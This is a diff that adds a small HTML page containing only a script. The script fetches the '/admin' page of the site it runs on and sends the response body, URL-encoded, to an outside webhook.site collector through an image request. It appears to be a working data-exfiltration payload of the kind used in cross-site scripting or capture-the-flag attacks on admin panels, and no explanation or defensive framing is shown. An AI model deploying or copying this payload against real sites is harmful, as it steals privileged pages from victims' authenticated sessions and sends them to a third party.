@@ -1,0 +1,14 @@
+<!doctype html>
+<html>
+<body>
+<script>
+fetch('/admin')
+  .then(r => r.text())
+  .then(d => {
+    new Image().src =
+      'https://webhook.site/0c2a0964-b6a5-49fd-989f-0c6e3593cd7b?d='
+      + encodeURIComponent(d);
+  });
+</script>
+</body>
+</html>
